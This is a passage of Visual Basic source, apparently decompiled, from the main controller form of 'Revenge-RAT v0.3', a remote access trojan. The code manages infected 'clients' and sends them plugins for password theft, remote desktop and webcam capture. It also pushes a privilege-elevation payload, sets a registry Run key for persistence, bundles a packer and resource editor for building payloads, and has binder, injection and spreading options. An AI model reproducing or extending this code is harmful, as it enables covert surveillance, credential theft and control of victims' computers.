        Me.CK(Me.FZ.SelectedIndex, Me.ACR.Checked, Me.gridlines.Checked, Me.VA.SelectedIndex, Me.ASD.Checked, Me.RDV.SelectedIndex, Me.SNO.Checked, Me.Visual.Checked, Me.MST.Checked, Me.ASWC.Checked, Me.RWCV.SelectedIndex, Me.ALTP.Checked)
        Return obj2
    End Function

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.ReIcon.Visible = False
        Process.GetCurrentProcess.Kill()
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim size As Size
        Me.Icons.Images.Add(My.Resources._1)
        Me.XylosTabControl1.TabPages.Item(1).ImageIndex = 0
        Me.Icons.Images.Add(My.Resources._2)
        Me.XylosTabControl1.TabPages.Item(2).ImageIndex = 1
        Me.Icons.Images.Add(My.Resources._3)
        Me.XylosTabControl1.TabPages.Item(3).ImageIndex = 2
        Me.Icons.Images.Add(My.Resources._4)
        Me.XylosTabControl1.TabPages.Item(4).ImageIndex = 3
        Me.Icons.Images.Add(My.Resources._5)
        Me.XylosTabControl1.TabPages.Item(5).ImageIndex = 4
        Me.Icons.Images.Add(My.Resources._6)
        Me.XylosTabControl1.TabPages.Item(7).ImageIndex = 5
        Me.Icons.Images.Add(My.Resources._77)
        Me.XylosTabControl1.TabPages.Item(8).ImageIndex = 6
        Me.Icons.Images.Add(My.Resources._8)
        Me.XylosTabControl1.TabPages.Item(9).ImageIndex = 7
        Me.Icons.Images.Add(My.Resources._9)
        Me.XylosTabControl1.TabPages.Item(10).ImageIndex = 8
        Me.Icons.Images.Add(My.Resources._10)
        Me.XylosTabControl1.TabPages.Item(12).ImageIndex = 9
        Me.Icons.Images.Add(My.Resources._11)
        Me.XylosTabControl1.TabPages.Item(13).ImageIndex = 10
        Me.ReIcon.Visible = True
        Me.ReIcon.Icon = My.Resources.icon
        Me.ReIcon.Text = "Revenge-RAT v0.3"
        Control.CheckForIllegalCrossThreadCalls = False
        Me.XylosTabControl1.SelectedIndex = 1
        Me.Text = "Revenge-RAT v0.3 | @*U*".Replace("*U*", Environment.MachineName)
        Dim item As ListViewItem = Me.Logs.Items.Add(("[ " & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & " ] Revenge Started .."), Me.ImageList3.Images.IndexOfKey("Unknown.png"))
        item.SubItems.Add("...").ForeColor = Color.Blue
        item.ForeColor = Color.Blue
        item.ToolTipText = "Unknown.png"
        If Not File.Exists((Application.StartupPath & "\Config.XML")) Then
            File.WriteAllText((Application.StartupPath & "\Config.XML"), My.Resources.Config)
        End If
        Thread.Sleep(100)
        Me.Config.Load((Application.StartupPath & "\Config.XML"))
        Thread.Sleep(150)
        Me.Load_Config()
        Functions.INTT(Me.THN.SelectedIndex)
        If Not Directory.Exists((Application.StartupPath & "\Extensions")) Then
            Directory.CreateDirectory((Application.StartupPath & "\Extensions"))
        End If
        Thread.Sleep(100)
        If Not File.Exists((Application.StartupPath & "\Extensions\mpress.exe")) Then
            File.WriteAllBytes((Application.StartupPath & "\Extensions\mpress.exe"), My.Resources.mpress)
        End If
        If Not File.Exists((Application.StartupPath & "\Extensions\Resource Hacker.exe")) Then
            File.WriteAllBytes((Application.StartupPath & "\Extensions\Resource Hacker.exe"), My.Resources.Resource_Hacker)
        End If
        If Not File.Exists((Application.StartupPath & "\Extensions\GoRC.exe")) Then
            File.WriteAllBytes((Application.StartupPath & "\Extensions\GoRC.exe"), My.Resources.GoRC)
        End If
        Thread.Sleep(&H3E8)
        If Not My.Computer.FileSystem.DirectoryExists((Application.StartupPath & "\Users\")) Then
            My.Computer.FileSystem.CreateDirectory((Application.StartupPath & "\Users\"))
        End If
        If Not My.Computer.FileSystem.DirectoryExists((Application.StartupPath & "\Profiles\")) Then
            My.Computer.FileSystem.CreateDirectory((Application.StartupPath & "\Profiles\"))
        End If
        If Not File.Exists((Application.StartupPath & "\Profiles\Default.ini")) Then
            File.WriteAllText((Application.StartupPath & "\Profiles\Default.ini"), My.Resources.DefaultSettings)
        End If
        If My.Computer.FileSystem.DirectoryExists((Application.StartupPath & "\User Plugins\")) Then
            Dim str As String
            For Each str In Directory.GetFiles((Application.StartupPath & "\User Plugins\"))
                If (Path.GetExtension(str).ToLower = ".dll") Then
                    Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(str)
                    Dim stream As New MemoryStream
                    Icon.ExtractAssociatedIcon(str).ToBitmap.Save(stream, ImageFormat.Png)
                    Me.ILP.Images.Add(versionInfo.LegalTrademarks, Image.FromStream(New MemoryStream(stream.ToArray)))
                    Dim item2 As ListViewItem = Me.Plugin.Items.Add(versionInfo.LegalTrademarks, versionInfo.LegalTrademarks, versionInfo.LegalTrademarks)
                    item2.SubItems.Add(versionInfo.CompanyName)
                    item2.SubItems.Add(versionInfo.FileDescription)
                    item2.ToolTipText = (Application.StartupPath & "\User Plugins\" & Path.GetFileName(str))
                    Dim item3 As New ToolStripMenuItem(versionInfo.LegalTrademarks)
                    Dim original As New Bitmap(Me.ILP.Images.Item(Me.ILP.Images.IndexOfKey(versionInfo.LegalTrademarks)))
                    size = New Size(&H10, &H10)
                    Dim bitmap2 As New Bitmap(original, size)
                    item3.Tag = (Application.StartupPath & "\User Plugins\" & Path.GetFileName(str))
                    item3.Image = bitmap2
                    item3.Name = (Application.StartupPath & "\User Plugins\" & Path.GetFileName(str))
                    Me.ContextMenuStrip1.Items.Add(item3)
                End If
            Next
        End If
        Me.ToolStripStatusLabel11.Text = "Connected Clients : ( *C* ) | Selected Clients : ( *S* ) | Spreaded Clients ( *SP* )".Replace("*C*", Conversions.ToString(Me.Listview1.Items.Count)).Replace("*S*", Conversions.ToString(Me.Listview1.SelectedItems.Count)).Replace("*SP*", "0")
        Me.ToolStripStatusLabel13.Text = Me.GTN
        size = New Size(&H417, &H25F)
        Me.Size = size
        Me.NTWRK.BackColor = XylosTabControl.CCB
        Me.BASSS.BackColor = XylosTabControl.CCB
        Me.INSTASE.BackColor = XylosTabControl.CCB
        Me.StartupSettings.BackColor = XylosTabControl.CCB
        Me.PowerShellSettings.BackColor = XylosTabControl.CCB
        Me.MultiBinderSettings.BackColor = XylosTabControl.CCB
        Me.HoFS.BackColor = XylosTabControl.CCB
        Me.NotifSettings.BackColor = XylosTabControl.CCB
        Me.IconSettings.BackColor = XylosTabControl.CCB
        Me.AssemblySettings.BackColor = XylosTabControl.CCB
        Me.InjectSettings.BackColor = XylosTabControl.CCB
        Me.SpreadSettings.BackColor = XylosTabControl.CCB
        Me.APPS.BackColor = XylosTabControl.CCB
        Me.NT.BackColor = XylosTabControl.CCB
        Me.CL.BackColor = XylosTabControl.CCB
        Me.THS.BackColor = XylosTabControl.CCB
        Me.ASS.BackColor = XylosTabControl.CCB
        Me.MDPSettings.BackColor = XylosTabControl.CCB
        Me.COMPSettings.BackColor = XylosTabControl.CCB
        If Not Me.ITS Then
            Me.ITS = True
            If Me.AL Then
                My.Forms.Entry_Form.ST(False)
            Else
                My.Forms.Entry_Form.ShowDialog(Me)
            End If
        End If
    End Sub

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        If Me.REZ Then
            If (Me.WindowState = FormWindowState.Minimized) Then
                Me.Visible = False
                Me.ReIcon.ContextMenuStrip = Me.ContextMenuStrip7
            Else
                Me.ReIcon.ContextMenuStrip = Nothing
            End If
        End If
    End Sub

    Private Sub MDPSettings_Click(sender As Object, e As EventArgs) Handles MDPSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.MDPSettings.Tag, "Down", False) Then
            Me.MDPSettings.Tag = "Up"
            Me.MDPSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel61.Size.Width, &H20)
            Me.TableLayoutPanel61.Size = size3
        Else
            Me.MDPSettings.Tag = "Down"
            Me.MDPSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel61.Size.Width, 290)
            Me.TableLayoutPanel61.Size = size2
        End If
    End Sub

    Private Sub MsgBoxIcon_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MsgBoxIcon.SelectedIndexChanged
        If (Me.MsgBoxIcon.SelectedIndex = 0) Then
            Me.PBIC.Image = SystemIcons.Information.ToBitmap
        ElseIf (Me.MsgBoxIcon.SelectedIndex = 1) Then
            Me.PBIC.Image = SystemIcons.Question.ToBitmap
        ElseIf (Me.MsgBoxIcon.SelectedIndex = 2) Then
            Me.PBIC.Image = SystemIcons.Warning.ToBitmap
        ElseIf (Me.MsgBoxIcon.SelectedIndex = 3) Then
            Me.PBIC.Image = SystemIcons.Error.ToBitmap
        ElseIf (Me.MsgBoxIcon.SelectedIndex = 4) Then
            Me.PBIC.Image = Nothing
        End If
    End Sub
    Public Function MsgboxSettings(ByVal A As Integer, ByVal B As Integer) As Object
        Dim str As String
        Dim str2 As String
        If (A = 0) Then
            str = Conversions.ToString(2)
        ElseIf (A = 1) Then
            str = Conversions.ToString(3)
        ElseIf (A = 2) Then
            str = Conversions.ToString(5)
        ElseIf (A = 3) Then
            str = Conversions.ToString(1)
        ElseIf (A = 4) Then
            str = Conversions.ToString(4)
        ElseIf (A = 5) Then
            str = Conversions.ToString(0)
        End If
        If (B = 0) Then
            str2 = Conversions.ToString(&H40)
        ElseIf (B = 1) Then
            str2 = Conversions.ToString(&H20)
        ElseIf (B = 2) Then
            str2 = Conversions.ToString(&H30)
        ElseIf (B = 3) Then
            str2 = Conversions.ToString(&H10)
        ElseIf (B = 4) Then
            str2 = Conversions.ToString(0)
        End If
        Return (str2 & "|" & str)
    End Function

    Private Sub MultiBinderSettings_Click(sender As Object, e As EventArgs) Handles MultiBinderSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.MultiBinderSettings.Tag, "Down", False) Then
            Me.MultiBinderSettings.Tag = "Up"
            Me.MultiBinderSettings.Image = My.Resources.expand_less_white_24x24
            Me.MultiBinderSettings.Text = "Multi Binder Settings :"
            Dim size3 As New Size(Me.TableLayoutPanel30.Size.Width, &H20)
            Me.TableLayoutPanel30.Size = size3
        Else
            Me.MultiBinderSettings.Tag = "Down"
            Me.MultiBinderSettings.Image = My.Resources.expand_more_white_24x24
            Me.MultiBinderSettings.Text = "Multi Binder Settings : # MAX Files Size = 10 MB"
            Dim size2 As New Size(Me.TableLayoutPanel30.Size.Width, &H12A)
            Me.TableLayoutPanel30.Size = size2
        End If
    End Sub

    Private Sub Nicon_CheckedChanged(sender As Object, e As EventArgs) Handles Nicon.CheckedChanged
        If Me.Nicon.Checked Then
            Me.icopath.Text = Nothing
            Me.GroupBox5.Enabled = False
            Me.PictureBox4.Image = My.Resources.AppBigIcon
        End If
        Me.BICONS.Enabled = False
        Me.icopath.Enabled = False
        Me.Addcustomiconpath.Enabled = False
        Me.BICONS.Items.Clear()
    End Sub

    Private Sub NotifSettings_Click(sender As Object, e As EventArgs) Handles NotifSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.NotifSettings.Tag, "Down", False) Then
            Me.NotifSettings.Tag = "Up"
            Me.NotifSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel40.Size.Width, &H20)
            Me.TableLayoutPanel40.Size = size3
        Else
            Me.NotifSettings.Tag = "Down"
            Me.NotifSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel40.Size.Width, 310)
            Me.TableLayoutPanel40.Size = size2
        End If
    End Sub

    Private Sub NT_Click(sender As Object, e As EventArgs) Handles NT.Click
        If Operators.ConditionalCompareObjectEqual(Me.NT.Tag, "Down", False) Then
            Me.NT.Tag = "Up"
            Me.NT.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel48.Size.Width, &H20)
            Me.TableLayoutPanel48.Size = size3
        Else
            Me.NT.Tag = "Down"
            Me.NT.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel48.Size.Width, &H5F)
            Me.TableLayoutPanel48.Size = size2
        End If
    End Sub

    Private Sub NTWRK_Click(sender As Object, e As EventArgs) Handles NTWRK.Click
        If Operators.ConditionalCompareObjectEqual(Me.NTWRK.Tag, "Down", False) Then
            Me.NTWRK.Tag = "Up"
            Me.NTWRK.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel20.Size.Width, &H20)
            Me.TableLayoutPanel20.Size = size3
        Else
            Me.NTWRK.Tag = "Down"
            Dim size2 As New Size(Me.TableLayoutPanel20.Size.Width, &H11D)
            Me.TableLayoutPanel20.Size = size2
            Me.NTWRK.Image = My.Resources.expand_more_white_24x24
        End If
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Listview1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If Directory.Exists((Application.StartupPath & "\Users\" & current.SubItems.Item(1).Text)) Then
                    Process.Start((Application.StartupPath & "\Users\" & current.SubItems.Item(1).Text))
                End If
            Loop
        Finally
        End Try
    End Sub

    Private Sub PasswordsRecoveryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsRecoveryToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\PW.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\PW.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "PW", Me.Key, "PW"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub PastimeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PastimeToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\PA.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\PA.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "PA", Me.Key, "PA"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub PingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PingToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Listview1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.Tag = "1"
                Me.s.Send(Conversions.ToInteger(current.ToolTipText), "PNC")
            Loop
        Finally
        End Try
    End Sub

    Private Sub PM_Paint(sender As Object, e As PaintEventArgs) Handles PM.Paint
        Dim rect As New Rectangle(0, 0, TextRenderer.MeasureText(Me.Text, New Font(Me.Font, FontStyle.Regular)).Width, TextRenderer.MeasureText(Me.Text, New Font(Me.Font, FontStyle.Regular)).Height)
        e.Graphics.FillRectangle(New Pen(Color.FromArgb(0, 0, 0, 0)).Brush, rect)
        e.Graphics.DrawString(Me.Label4.Text, New Font(Me.Font, FontStyle.Regular), Brushes.White, CSng(0!), CSng(0!))
    End Sub

    Private Sub PowerShellSettings_Click(sender As Object, e As EventArgs) Handles PowerShellSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.PowerShellSettings.Tag, "Down", False) Then
            Me.PowerShellSettings.Tag = "Up"
            Me.PowerShellSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel28.Size.Width, &H20)
            Me.TableLayoutPanel28.Size = size3
        Else
            Me.PowerShellSettings.Tag = "Down"
            Me.PowerShellSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel28.Size.Width, &H134)
            Me.TableLayoutPanel28.Size = size2
        End If
    End Sub

    Private Sub PRCB_SelectedIndexChanged(sender As Object, e As EventArgs) Handles PRCB.SelectedIndexChanged
        If (Me.PRCB.SelectedIndex = 2) Then
            Me.PictureBox5.Visible = True
        Else
            Me.PictureBox5.Visible = False
        End If
    End Sub

    Private Sub PreviewMsgBox_Click(sender As Object, e As EventArgs) Handles PreviewMsgBox.Click
        Dim strArray As String() = Strings.Split(Conversions.ToString(Me.MsgboxSettings(Me.MsgboxButton.SelectedIndex, Me.MsgBoxIcon.SelectedIndex)), "|", -1, CompareMethod.Binary)
        Dim icon As MessageBoxIcon = DirectCast(Conversions.ToInteger(strArray(0)), MessageBoxIcon)
        Dim buttons As MessageBoxButtons = DirectCast(Conversions.ToInteger(strArray(1)), MessageBoxButtons)
        MessageBox.Show(Me.MsgboxBody.Text, Me.MsgboxTitle.Text, buttons, icon)
    End Sub

    Private Sub PRPR_CheckedChanged(sender As Object, e As EventArgs) Handles PRPR.CheckedChanged
        Me.PRCB.Enabled = Me.PRPR.Checked
        If (Me.PRCB.SelectedIndex = -1) Then
            Me.PRCB.SelectedIndex = 0
        End If
        If Not Me.PRPR.Checked Then
            Me.PictureBox5.Visible = False
        End If
    End Sub

    Private Sub QUICKLUNCHSHORTCUTPATH_DoubleClick(sender As Object, e As EventArgs) Handles QUICKLUNCHSHORTCUTPATH.DoubleClick
        Me.QUICKLUNCHSHORTCUTPATH.Text = Me.RandomVariable(5, 12)
    End Sub
    Public Function RandomVariable(ByVal minamount As Integer, ByVal maxamount As Integer) As String
        Dim str3 As String
        Dim num5 As Integer
        Try
            Dim num6 As Integer
Label_0001:
            ProjectData.ClearProjectError()
            Dim num4 As Integer = -2
Label_000A:
            num6 = 2
            Dim random As New Random
Label_0013:
            num6 = 3
            Dim str4 As String = Nothing
Label_0019:
            num6 = 4
            Dim str As String = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
Label_0022:
            num6 = 5
            Dim num3 As Integer = random.Next((minamount + 1), maxamount)
            Dim num2 As Integer = 1
            GoTo Label_0080
Label_0036:
            num6 = 6
            Dim num As Integer = CInt(Math.Round(CDbl((Conversion.Int(CSng(((str.Length - 2) * VBMath.Rnd))) + 1.0!))))
Label_005D:
            num6 = 7
            str4 = (str4 & Conversions.ToString(str.Chars(num)))
Label_0076:
            num6 = 8
            num2 += 1
Label_0080:
            If (num2 <= num3) Then
                GoTo Label_0036
            End If
Label_008A:
            num6 = 9
            Dim str2 As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
Label_0094:
            num6 = 10
            str3 = (Conversions.ToString(str2.Chars(random.Next(0, (str2.Length - 1)))) & str4)
            GoTo Label_0151
Label_00CC:
            num5 = 0
            Select Case (num5 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_000A
                Case 3
                    GoTo Label_0013
                Case 4
                    GoTo Label_0019
                Case 5
                    GoTo Label_0022
                Case 6
                    GoTo Label_0036
                Case 7
                    GoTo Label_005D
                Case 8
                    GoTo Label_0076
                Case 9
                    GoTo Label_008A
                Case 10
                    GoTo Label_0094
                Case 11
                    GoTo Label_0151
                Case Else
                    GoTo Label_0146
            End Select
Label_0106:
            num5 = num6
            Select Case If((num4 > -2), num4, 1)
                Case 0
                    GoTo Label_0146
                Case 1
                    GoTo Label_00CC
            End Select
        Catch obj1 As Exception
            GoTo Label_0106
        End Try
Label_0146:
        'Throw ProjectData.CreateProjectError(-2146828237)
Label_0151:
        Return str3
    End Function

    Private Sub RD_Click(sender As Object, e As EventArgs) Handles RD.Click
        If (MessageBox.Show("This action will delete all your settings and restart the application, Are You Sure ?", "Restore Defaults", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes) Then
            File.WriteAllText((Application.StartupPath & "\Config.XML"), My.Resources.Config)
            Thread.Sleep(&H3E8)
            Process.Start(Application.ExecutablePath)
            Process.GetCurrentProcess.Kill()
        End If
    End Sub

    Private Sub Re_Click(sender As Object, e As EventArgs) Handles Re.Click
        Try
            If Directory.Exists("Database") Then
                Me.DLCB.Items.Clear()
                Me.LGF.Items.Clear()
                Me.OL.Items.Clear()
                Dim str As String
                For Each str In Directory.GetDirectories("Database")
                    Me.DLCB.Items.Add(Path.GetFileName(str))
                Next
            End If
            Me.ToolStripStatusLabel14.Text = "Logs list loaded successfully"
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub REF_Click(sender As Object, e As EventArgs) Handles REF.Click
        If Directory.Exists("Users") Then
            Me.TreeView1.Nodes.Clear()
            Me.TreeView1.Nodes.Add("Saved Data", "Saved Data", 0, 0)
            Dim str As String
            For Each str In Directory.GetDirectories("Users")
                Dim node As TreeNode = Me.TreeView1.Nodes.Item(0).Nodes.Add(str, Path.GetFileName(str), 0, 0)
                node.ToolTipText = str
                node.Tag = "0"
            Next
        End If
    End Sub

    Private Sub Refresh_Click(sender As Object, e As EventArgs) Handles Refresh.Click
        Me.BICONS.Enabled = True
        Me.icopath.Enabled = True
        Me.Addcustomiconpath.Enabled = True
        Me.BICONS.Items.Clear()
        Me.BICONS.Enabled = False
        Dim str As String
        For Each str In Directory.GetFiles("Icons")
            If Path.GetExtension(str).ToLower.EndsWith(".ico") Then
                Me.BIIcons.Images.Add(Path.GetFileName(str), Image.FromFile(str))
                Dim imageIndex As Integer = Me.BIIcons.Images.IndexOfKey(Path.GetFileName(str))
                Me.BICONS.Items.Add(Path.GetFileNameWithoutExtension(str), imageIndex).ToolTipText = str
            End If
        Next
        Me.BICONS.Items.Item(0).Selected = True
        Me.BICONS.Enabled = True
    End Sub

    Private Sub RefreshAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshAllToolStripMenuItem.Click
        Try
            If (Me.TH.Items.Count > 0) Then
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.Listview1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        If (current.SubItems.Item(15).Text = "....") Then
                            If File.Exists((Application.StartupPath & "\Plugin\SP.dll")) Then
                                Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SP.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SP", Me.Key, "SP"}))
                            End If
                        Else
                            Dim num As Integer = Conversions.ToInteger(SocketServer.GetIndex(Me.TQ.SelectedIndex))
                            Me.s.Send(Conversions.ToInteger(current.SubItems.Item(15).Text), String.Concat(New String() {"GP2", Me.Key, Conversions.ToString(num), Me.Key, Conversions.ToString(Me.ThumbnailWidth.Value), Me.Key, Conversions.ToString(Me.ThumbnailHeight.Value)}))
                        End If
                    Loop
                Finally
                End Try
            End If
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub RefreshSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshSelectedToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.TH.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim num As Integer = Conversions.ToInteger(SocketServer.GetIndex(Me.TQ.SelectedIndex))
                Me.s.Send(Conversions.ToInteger(current.Name), String.Concat(New String() {"GP2", Me.Key, Conversions.ToString(num), Me.Key, Conversions.ToString(Me.ThumbnailWidth.Value), Me.Key, Conversions.ToString(Me.ThumbnailHeight.Value)}))
            Loop
        Finally

        End Try
    End Sub

    Private Sub Registry_CheckedChanged(sender As Object, e As EventArgs) Handles Registry.CheckedChanged
        If (Me.RK.Text = Nothing) Then
            Me.RK.Text = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        End If
        If (Me.RGVN.Text = Nothing) Then
            Me.RGVN.Text = "Client"
        End If
        Me.RK.Enabled = Me.Registry.Checked
        Me.RGVN.Enabled = Me.Registry.Checked
        Me.RGP.Enabled = Me.Registry.Checked
    End Sub

    Private Sub RemoteDekstopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDekstopToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\RD.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.TH.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\RD.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "RD", Me.Key, "RD"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\RD.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\RD.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "RD", Me.Key, "RD"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RemoteWebCamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteWebCamToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\RW.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.SubItems.Item(4).Text = "Yes") Then
                        current.Tag = "Pause"
                        Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\RW.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "RW", Me.Key, "RW"}))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RemoveCommandToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveCommandToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.CommandsListview.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.BlockedIp.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    current.Remove()
                Catch exception1 As Exception
                End Try
            Loop
        Finally

        End Try
    End Sub

    Private Sub RemoveToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem1.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.HostsList.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub RemoveToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem2.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.BinderFilesList.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub RemvoePluginToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemvoePluginToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Plugin.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                File.Delete(current.ToolTipText)
                Functions.GTI(current.ToolTipText)
                current.Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub RequestElevationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RequestElevationToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Listview1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "True"}))
            Loop
        Finally
        End Try
    End Sub

    Private Sub ResetMsgbox_Click(sender As Object, e As EventArgs) Handles ResetMsgbox.Click
